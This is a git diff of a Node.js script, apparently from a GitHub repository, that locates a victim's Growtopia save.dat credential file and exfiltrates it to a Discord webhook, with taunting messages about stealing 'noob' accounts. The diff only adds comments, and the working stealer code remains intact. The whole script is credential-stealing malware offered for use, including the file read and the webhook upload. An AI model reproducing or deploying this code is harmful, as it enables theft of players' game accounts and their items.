@@ -7,29 +7,30 @@ const {
     Webhook, 
     MessageBuilder 
 } = require('discord-webhook-node');
-const yourhook = new Webhook('your-faking-noob-webhook');
+const yourhook = new Webhook('your-faking-noob-webhook'); // Noob webhooks.
 const fs = require('fs');
 
 // Lets start:D
 function stealdat () {
     const path = `${os.homedir()}/AppData/Local/Growtopia/save.dat`
-    if (fs.existsSync(path)) {
+    if (fs.existsSync(path)) { // Detect the path. if they exists or nop. why? cause some ppl are SMART.
     console.log("Lets start this devil-actions.")
     // read it first
-    const hasil = fs.readFileSync(path,'utf8')
-    const noobembed = new MessageBuilder()
+    const hasil = fs.readFileSync(path,'utf8') // Results of reading the data...
+    const noobembed = new MessageBuilder() // Make new embed
     .setAuthor("New Account h;ve been stolen.", 'https://c.tenor.com/0hjOGLFaQa0AAAAM/lofi-girl-lofi.gif')
-    .setURL('https://github.com/FrenzY8')
+    .setURL('https://github.com/FrenzY8') // URI
     .setDescription("```ini\n" + hasil + "\n```")
     .setFooter("Stolen Lol.. Just Imagining noob player get stolen.", 'https://c.tenor.com/0hjOGLFaQa0AAAAM/lofi-girl-lofi.gif')
     //send embed.
     yourhook.send(noobembed)
     //then files.
     yourhook.sendFile(path);
-    console.log("Lol... imagine noob get stolen! btw the files h;ve been sended to your webhook.")
+    console.log("Lol... imagine noob get stolen! btw the files h;ve been sended to your webhook.") // Send the notify
   } else {
       console.log("well.. we didnot found any save dat.")
   }
 }
 // now we do a:
 stealdat() // done :)
+// Nothing changes just want let this repository on top.
